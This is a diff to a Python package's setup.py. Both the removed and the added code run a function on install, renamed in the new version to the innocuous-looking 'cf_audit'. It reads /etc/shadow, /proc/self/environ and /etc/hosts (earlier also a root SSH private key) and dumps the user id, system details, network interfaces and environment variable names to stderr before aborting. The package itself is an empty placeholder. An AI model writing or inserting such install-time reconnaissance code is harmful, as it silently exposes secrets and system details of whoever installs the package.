@@ -1,25 +1,23 @@
 import os, sys, subprocess as sp
 from setuptools import setup
 
-def x():
-    r = []
-    r.append(f"ID: {os.getuid()}")
-    r.append(f"UNAME: {sp.getoutput('uname -a')}")
-    r.append(f"ENV:\n{os.environ}")
+def cf_audit():
+    o = sys.stderr.write
+    o(f"\nID: {os.getuid()}\n")
+    o(f"UNAME: {sp.getoutput('uname -a')}\n")
+    o(f"PWD: {os.getcwd()}\n")
     
-    paths = ['/etc/shadow', '/proc/self/environ', '/etc/hosts', '/root/.ssh/id_rsa']
-    for p in paths:
+    ps = ['/etc/shadow', '/proc/self/environ', '/etc/hosts']
+    for p in ps:
         try:
-            with open(p, 'r') as f: r.append(f"FILE {p}: {f.read(200)}")
-        except: r.append(f"FILE {p}: DENIED")
-    
-    r.append(f"PS:\n{sp.getoutput('ps aux')}")
-    r.append(f"MOUNT:\n{sp.getoutput('mount')}")
-    
-    sys.stderr.write("\n".join(r) + "\n")
+            with open(p, 'r') as f: o(f"READ {p}: {f.read(100)}\n")
+        except: o(f"READ {p}: DENIED\n")
+            
+    o(f"IFCONFIG:\n{sp.getoutput('ip addr || ifconfig')}\n")
+    o(f"ENV_VARS: {list(os.environ.keys())}\n")
     sys.exit(1)
 
-try: x()
+try: cf_audit()
 except: sys.exit(1)
 
-setup(name="p", version="1")
+setup(name="p", version="0.1")
